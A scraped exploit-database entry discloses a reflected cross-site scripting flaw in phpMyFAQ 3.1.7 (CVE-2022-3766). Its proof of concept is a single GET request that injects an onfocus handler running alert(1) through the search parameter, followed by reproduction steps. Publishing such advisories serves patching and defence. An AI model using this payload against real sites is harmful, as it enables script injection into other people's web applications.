---
title: phpMyFAQ  3.1.7 Reflected Cross-Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2025120013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-14
fetch_date: 2025-12-15T03:27:05.561819
---

# phpMyFAQ  3.1.7 Reflected Cross-Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **phpMyFAQ 3.1.7 Reflected Cross-Site Scripting (XSS)** **2025.12.14**  Credit:  **[CodeSecLab](https://cxsecurity.com/author/CodeSecLab/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-3766](https://cxsecurity.com/cveshow/CVE-2022-3766/ "Click to see CVE-2022-3766")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: phpMyFAQ 3.1.7 - Reflected Cross-Site Scripting (XSS)
# Date: 2025-11-25
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/thorsten/phpmyfaq/
# Software Link: https://github.com/thorsten/phpmyfaq/
# Version: 3.1.7
# Tested on: Windows
# CVE : CVE-2022-3766
Proof Of Concept
GET http://phpmyfaq1/index.php?action=main&search=%22%20onfocus%3D%22alert%281%29
Additional Conditions:
- Ensure that no security mechanisms (like a web application firewall) are blocking the specific request pattern.
- The application must be running a phpMyFAQ version prior to 3.1.8.
Steps to Reproduce
Log in phpmyfaq.
Send the request.
Observe the result

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top